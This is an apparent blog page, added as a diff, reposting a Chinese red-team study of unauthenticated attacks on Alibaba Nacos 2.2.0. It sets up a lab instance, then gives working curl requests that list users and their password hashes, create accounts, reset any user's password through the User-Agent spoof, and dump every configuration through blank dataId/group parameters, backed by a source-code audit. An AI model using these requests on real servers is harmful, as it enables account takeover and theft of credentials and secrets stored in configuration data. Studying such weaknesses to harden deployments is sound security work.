@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    
+    <title>云原生组件Nacos新型红队手法研究 | 氕氘氚</title>
+    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
+    <meta name="HandheldFriendly" content="True"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="google-site-verification" content=""/>
+    <meta name="baidu-site-verification" content=""/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="云原生组件Nacos新型红队手法研究 本文转自Zhuri 并作补充  组件简介 Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态">
+<meta property="og:type" content="article">
+<meta property="og:title" content="云原生组件Nacos新型红队手法研究">
+<meta property="og:url" content="http://example.com/2023/07/24/Nacos-AccessToken/index.html">
+<meta property="og:site_name" content="氕氘氚">
+<meta property="og:description" content="云原生组件Nacos新型红队手法研究 本文转自Zhuri 并作补充  组件简介 Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/1.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/2.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/3.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/4.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/5.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/6.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/7.png">
+<meta property="og:image" content="http://example.com/2023/07/24/Nacos-AccessToken/8.png">
+<meta property="article:published_time" content="2023-07-24T18:29:25.000Z">
+<meta property="article:modified_time" content="2023-09-02T07:44:59.270Z">
+<meta property="article:author" content="Szczecin">
+<meta property="article:tag" content="Reprint">
+<meta property="article:tag" content="Exploit">
+<meta property="article:tag" content="Nacos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/07/24/Nacos-AccessToken/1.png">
+    
+
+    <!-- Favicon -->
+    
+        <link rel="icon" href="/img/favicon.ico" />
+    
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">
+
+    
+<link rel="stylesheet" href="/style.css">
+
+    <script>
+      function setLoadingBarProgress(num) {
+        document.getElementById('loading-bar').style.width = num + "%";
+      }
+    </script>
+
+    
+
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+
+<div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+
+<script>setLoadingBarProgress(20)</script>
+
+<div id="site-wrapper">
+
+    <header id="header">
+    <div id="header-wrapper" class="clearfix">
+        <a id="logo" href="/">
+            <img src="/img/logo.png"/>
+            <span id="site-desc">
+                Be A Gorgeous World
+            </span>
+        </a>
+        <button id="site-nav-switch">
+            <span class="icon icon-menu"></span>
+        </button>
+    </div>
+</header>
+    <script>setLoadingBarProgress(40);</script>
+
+    <main id="main" role="main">
+        <article id="post-Nacos-AccessToken"
+         class="post article white-box article-type-post"
+         itemscope itemprop="blogPost">
+    <h2 class="title">
+        <a href="/2023/07/24/Nacos-AccessToken/">
+            云原生组件Nacos新型红队手法研究
+        </a>
+    </h2>
+    <time>
+        Jul 24, 2023
+    </time>
+    <section class="content">
+        <div class="article-entry" itemprop="articleBody">
+            <h1><span id="云原生组件nacos新型红队手法研究">云原生组件Nacos新型红队手法研究</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">Zhuri</a> 并作补充</p>
+</blockquote>
+<h2><span id="组件简介">组件简介</span></h2><blockquote>
+<p>Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos 致力于帮助您发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，帮助您快速实现动态服务发现、服务配置、服务元数据及流量管理。<br>Nacos 帮助您更敏捷和容易地构建、交付和管理微服务平台。Nacos 是构建以“服务”为中心的现代应用架构 (例如微服务范式、云原生范式) 的服务基础设施。</p>
+</blockquote>
+<h2><span id="历史漏洞">历史漏洞</span></h2><blockquote>
+<p>2020年12月29日，Nacos官方在github发布的issue中披露Alibaba Nacos 存在一个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进行任意操作，包括创建新用户并进行登录后操作。<br><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/issues/1105">https://github.com/alibaba/nacos/issues/1105</a><br>在Nacos 2.0版本存在未授权访问漏洞，程序未有效对于用户权限进行判断，导致能够添加任意用户、修改任意用户密码等等问题。<br>这里就不做过多介绍了，网上有很多。<br>就在我撰写本文的时候，官方刚刚发布了最新的版本2.2.0 (Dec 14, 2022)，我们就来一探究竟。</p>
+</blockquote>
+<h2><span id="部署方式">部署方式</span></h2><blockquote>
+<p>为了方便起见，我这里使用Debian系统并采用的单机部署的方式。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install default-jdk</span><br><span class="line">sudo ufw <span class="built_in">disable</span></span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/2.2.0/nacos-server-2.2.0.zip</span><br><span class="line">unzip nacos-server-2.2.0.zip</span><br><span class="line"><span class="built_in">cd</span> nacos/bin</span><br><span class="line">bash startup.sh -m standalone</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>然后访问<a target="_blank" rel="noopener" href="http://ip:8848/nacos%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%87%BA%E7%8E%B0%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%B0%B1%E8%AF%B4%E6%98%8E%E9%83%A8%E7%BD%B2%E6%88%90%E5%8A%9F%E4%BA%86%EF%BC%8C%E9%BB%98%E8%AE%A4%E7%9A%84%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%B8%BAnacos/nacos%E3%80%82">http://ip:8848/nacos，如果出现登录界面，就说明部署成功了，默认的账号密码为nacos/nacos。</a></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>我们首先尝试使用老版本的payload尝试能不能打。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>不出意外，返回:</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">caused: Parameter conditions <span class="string">&quot;search=blur&quot;</span> OR <span class="string">&quot;search=accurate&quot;</span> not met <span class="keyword">for</span> actual request parameters: pageNo=&#123;1&#125;, pageSize=&#123;9&#125;;%</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们仔细看一下报错，提示说是缺少search&#x3D;blur或者search&#x3D;accurate，那我们加上再试试看。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br><span class="line"></span><br><span class="line">curl <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27;</span> -H <span class="string">&#x27;User-Agent: Nacos-Server&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/07/24/Nacos-AccessToken/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>这就成功了？<br>我一开始以为没修，后来发现，我通过查看鉴权相关文档时(<a target="_blank" rel="noopener" href="https://nacos.io/en-us/docs/auth.html)%EF%BC%8C%E5%AE%83%E5%8F%AA%E6%8F%8F%E8%BF%B0%E4%BA%86%E5%A6%82%E4%BD%95%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%EF%BC%8C%E4%BB%A5%E5%8F%8A%E4%B8%8D%E5%BC%80%E5%90%AF%E9%89%B4%E6%9D%83%E7%9A%84%E5%90%8E%E6%9E%9C%EF%BC%8C%E4%BD%86%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E5%8A%A8%E5%8D%B4%E4%B8%8D%E5%BC%80%E9%89%B4%E6%9D%83%E7%9A%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%A0%B9%E6%8D%AEgithub%E7%9A%84issue%E6%9D%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E6%96%B9%E5%B9%B6%E4%B8%8D%E8%AE%A4%E4%B8%BA%E8%BF%99%E6%98%AF%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%A5%E8%87%B3%E4%BA%8E%E7%BD%91%E4%B8%8A%E5%87%BA%E4%BA%86%E4%B9%8B%E5%89%8D%E7%94%B1%E4%BA%8E%E4%B8%8D%E5%BD%93%E5%A4%84%E7%90%86User-Agent%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%90%8E%E4%BA%BA%E5%B0%91%E6%9C%89%E6%8C%96%E6%8E%98%E5%85%B6%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%8C%E7%BD%91%E4%B8%8A%E7%9A%84%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E4%B9%9F%E5%9F%BA%E6%9C%AC%E4%B8%8A%E5%81%9C%E7%95%99%E5%9C%A8%E9%82%A3%E6%AC%A1CVE%E3%80%82">https://nacos.io/en-us/docs/auth.html)，它只描述了如何开启鉴权，以及不开启鉴权的后果，但是默认启动却不开鉴权的，并且根据github的issue来看，官方并不认为这是漏洞，以至于网上出了之前由于不当处理User-Agent导致的未授权访问漏洞之后，后人少有挖掘其利用方式，网上的相关资料也基本上停留在那次CVE。</a></p>
+</blockquote>
+<h2><span id="未开启auth">未开启auth</span></h2><blockquote>
+<p>由于默认是不开auth的，所以我们先来讨论未开启auth的情况。</p>
+</blockquote>
+<h3><span id="读取用户账号密码">读取用户账号密码</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;totalCount&quot;</span>:1,<span class="string">&quot;pageNumber&quot;</span>:1,<span class="string">&quot;pagesAvailable&quot;</span>:1,<span class="string">&quot;pageItems&quot;</span>:[&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;$2a$10<span class="variable">$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu</span>&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="未授权添加用户">未授权添加用户</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27;</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:200,<span class="string">&quot;message&quot;</span>:null,<span class="string">&quot;data&quot;</span>:<span class="string">&quot;create user ok!&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3><span id="任意用户密码更改">任意用户密码更改</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/auth/users?accessToken=&#x27;</span> -H <span class="string">&#x27;User-Agent:Nacos-Server&#x27;</span> -d <span class="string">&#x27;username=test1&amp;newPassword=test2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基本上目前主流针对Nacos的利用手法就停留在这里了，以至于防守方会通过WAF规则的形式来拦截掉这几个url请求。<br>但是根据代码审计以及官方的api接口文档，我们还能找到许多可以利用的接口，官方文档里面有的，我就不说了，大家自己可以去OpenAPI（<a target="_blank" rel="noopener" href="https://nacos.io/zh-cn/docs/open-api.html%EF%BC%89%E8%87%AA%E8%A1%8C%E6%9F%A5%E7%9C%8B%EF%BC%8C%E5%AE%98%E7%BD%91%E9%87%8C%E9%9D%A2%E7%9A%84OpenAPI%E6%89%80%E7%BB%99%E5%87%BA%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%B7%E5%80%BC%E5%B9%B6%E4%B8%8D%E6%98%AF%E5%BE%88%E9%AB%98%E3%80%82">https://nacos.io/zh-cn/docs/open-api.html）自行查看，官网里面的OpenAPI所给出的利用价值并不是很高。</a></p>
+</blockquote>
+<h3><span id="代码审计">代码审计</span></h3><blockquote>
+<p>下载源码后通过简单查找发现在<code>nacos/config/src/main/java/com/alibaba/nacos/config/server/constant/Constants.java</code>和<code>nacos/core/src/main/java/com/alibaba/nacos/core/utils/Commons.java</code>文件下，有相关路由的定义，相关代码如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v1/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE_V2_PATH</span> <span class="operator">=</span> <span class="string">&quot;/v2/cs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">OPS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/ops&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CAPACITY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/capacity&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COMMUNICATION_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/communication&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/configs&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CONFIG_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/config&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HEALTH_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/health&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HISTORY_CONTROLLER_V2_PATH</span> <span class="operator">=</span> BASE_V2_PATH + <span class="string">&quot;/history&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LISTENER_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/listener&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NAMESPACE_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/namespaces&quot;</span>;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">METRICS_CONTROLLER_PATH</span> <span class="operator">=</span> BASE_PATH + <span class="string">&quot;/metrics&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Commons</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_CONTEXT</span> <span class="operator">=</span> <span class="string">&quot;/nacos&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION</span> <span class="operator">=</span> <span class="string">&quot;/v1&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_SERVER_VERSION_V2</span> <span class="operator">=</span> <span class="string">&quot;/v2&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_NACOS_CORE_CONTEXT</span> <span class="operator">=</span> NACOS_SERVER_VERSION + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT</span> <span class="operator">=</span> DEFAULT_NACOS_CORE_CONTEXT;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NACOS_CORE_CONTEXT_V2</span> <span class="operator">=</span> NACOS_SERVER_VERSION_V2 + <span class="string">&quot;/core&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到有V1、V2两种API接口，我们根据不同类型再具体分析。</p>
+</blockquote>
+<h3><span id="获取配置数据">获取配置数据</span></h3><blockquote>
+<p>根据官方OpenAPI的说明，你需要知道dataId与group的值，才能读取到对应的配置文件，如果留空或者不填，则会无法读取。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.example&amp;group=com.alibaba.nacos&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>事实真的是这样吗？<br>我们看一下<code>/config/src/main/java/com/alibaba/nacos/config/server/controller/ConfigController.java</code>文件中369行开始的代码。</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Query the configuration information and return it in JSON format.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=accurate&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">searchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId, <span class="meta">@RequestParam(&quot;group&quot;)</span> String group,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">100</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfo4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Fuzzy query configuration information. Fuzzy queries based only on content are not allowed, that is, both dataId</span></span><br><span class="line"><span class="comment">    * and group are NULL, but content is not NULL. In this case, all configurations are returned.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@GetMapping(params = &quot;search=blur&quot;)</span></span><br><span class="line">   <span class="meta">@Secured(action = ActionTypes.READ, signType = SignType.CONFIG)</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;ConfigInfo&gt; <span class="title function_">fuzzySearchConfig</span><span class="params">(<span class="meta">@RequestParam(&quot;dataId&quot;)</span> String dataId,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;group&quot;)</span> String group, <span class="meta">@RequestParam(value = &quot;appName&quot;, required = false)</span> String appName,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;tenant&quot;, required = false, defaultValue = StringUtils.EMPTY)</span> String tenant,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(value = &quot;config_tags&quot;, required = false)</span> String configTags,</span></span><br><span class="line"><span class="params">           <span class="meta">@RequestParam(&quot;pageNo&quot;)</span> <span class="type">int</span> pageNo, <span class="meta">@RequestParam(&quot;pageSize&quot;)</span> <span class="type">int</span> pageSize)</span> &#123;</span><br><span class="line">       MetricsMonitor.getFuzzySearchMonitor().incrementAndGet();</span><br><span class="line">       Map&lt;String, Object&gt; configAdvanceInfo = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">50</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(appName)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;appName&quot;</span>, appName);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isNotBlank(configTags)) &#123;</span><br><span class="line">           configAdvanceInfo.put(<span class="string">&quot;config_tags&quot;</span>, configTags);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> configInfoPersistService.findConfigInfoLike4Page(pageNo, pageSize, dataId, group, tenant, configAdvanceInfo);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> <span class="string">&quot;serialize page error, dataId=&quot;</span> + dataId + <span class="string">&quot;, group=&quot;</span> + group;</span><br><span class="line">           LOGGER.error(errorMsg, e);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(errorMsg, e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我们可以看到首先先进行了<code>signType = SignType.CONFIG</code>的权限检查，这里的<code>signType</code>的一个作用就是检查<code>auth</code>是否开启，但是之前也提到过，<code>auth</code>是默认不开启的。接着我们继续分析，当参数<code>search=accurate</code>时，从GET请求中获取参数<code>dataId、group、appName、tenant、config_tags、pageNo、pageSize</code>参数，其中<code>appName、tenant、config_tags</code>不是必填的，接着先检查<code>appName</code>和<code>configTags</code>是否为空，我们直接留空或者不填就能绕过这个判断，然后接下来就是迷之操作了，直接给我全部返回了。<br>所以我们直接构造参数，就可以发现能够获取全部的配置文件了。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>或者：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&#x27;http://192.168.20.144:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span></span><br></pre></td></tr></table></figure>
